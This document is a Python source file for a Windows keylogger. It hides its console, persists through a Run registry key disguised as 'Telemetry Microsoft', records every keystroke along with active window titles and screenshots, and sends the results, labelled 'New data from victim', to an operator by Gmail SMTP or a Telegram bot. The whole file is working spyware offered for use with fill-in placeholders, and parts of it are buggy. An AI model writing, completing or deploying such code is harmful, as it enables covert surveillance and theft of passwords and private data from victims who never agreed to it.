#########Settings#######jj#

import sys
import keyboard
import win32api,pythoncom
import win32console
import win32gui
import telebot
import os,time,random,smtplib,string,base64
from winreg import *
from email.message import EmailMessage
# Create the container email message.
msg = EmailMessage()

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval

t=""
pics_names=[]

#########Settings########

yourgmail="EDITWITHYOURGMAIL"
yourgmailpass="EDITWITHYOURGMAILPASSWORD"
sendto="WHATDOYOUEAMILYOUWANTTOSEND"
interval=INTERVALINSECONDS
USER_ID_TELEGRAM=EDITWITHYOURUSERID
TOKEN_BOT="EDITWITHYOURTOKENBOT"
ENABLE_TELEGRAM=WISHENABLETELEGRAM
ENABLE_EMAIL=WISHENABLEEMAIL

########################

recently_active_windows = set()
bot = telebot.AsyncTeleBot(TOKEN_BOT)

try:
    f = open('Logfile.txt', 'a')
    f.close()
except:
    f = open('Logfile.txt', 'w')
    f.close()

def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Telemetry Microsoft', 0, REG_SZ,
               new_file_path)

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def ScreenShot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                       + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name+'.png')
    pyautogui.screenshot(name + '.png')
    
def Get_recently_active_windows():
    recently_windows = b''
    for w in recently_active_windows:
        recently_windows += b' \n' + w.encode('utf-8')
    recently_windows = b'\n\nRecently active windows: ' + recently_windows
    return recently_windows

def Mail_it(data, pics_names):
    recently_windows = Get_recently_active_windows()
    data = data.encode('utf-8') + recently_windows
    data = b'New data from victim\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()
                        
    for pic in pics_names:
        with open(pic, 'rb') as fp:
            img_data = fp.read()
        msg.add_attachment(img_data, maintype='image', subtype='png')
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, data)
        server.sendmail(yourgmail, sendto, img_data)
        server.close()

def Telegram_it(data, pics_names):
    recently_windows = Get_recently_active_windows()
    data = data.encode('utf-8') + recently_windows
    data = b'New data from victim\n' + data
    bot.send_message(USER_ID_TELEGRAM, data)
    
    for pic in pics_names:
        with open(pic, 'rb') as fp:
            img_data = fp.read()
        bot.send_photo(USER_ID_TELEGRAM, img_data)
    
def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval, recently_active_windows

    active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    recently_active_windows.add(active_window)
    
    data = event.name
    global t, start_time
    t = t + data

    if len(t) > 500:
        ScreenShot()
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) >= int(interval):
        ScreenShot()
        if ENABLE_EMAIL:
            Mail_it(t, pics_names)
        if ENABLE_TELEGRAM:
            Telegram_it(t, pics_names)
        t = ''


addStartup()
Hide()
keyboard.hook(OnKeyboardEvent, suppress=True)
start_time = time.time()
pythoncom.PumpMessages()
